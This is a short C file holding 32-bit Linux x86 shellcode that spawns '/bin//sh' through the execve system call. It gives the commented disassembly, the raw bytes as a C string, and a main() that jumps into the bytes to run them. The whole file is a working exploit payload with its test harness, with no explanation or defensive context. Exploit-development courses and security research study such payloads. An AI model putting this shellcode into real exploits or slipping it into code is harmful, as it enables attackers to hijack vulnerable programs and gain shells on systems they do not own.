/*
Opcode:

31 c0                xor    %eax,%eax
50                   push   %eax
68 2f 2f 73 68       push   $0x68732f2f
68 2f 62 69 6e       push   $0x6e69622f
89 e3                mov    %esp,%ebx
50                   push   %eax
53                   push   %ebx
89 e1                mov    %esp,%ecx
b0 0b                mov    $0xb,%al
cd 80                int    $0x80
*/

const char shellcode[] =
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
    "\x53\x89\xe1\xb0\x0b\xcd\x80";

int
main () {
    __asm__("jmp shellcode");
    return 0;
}
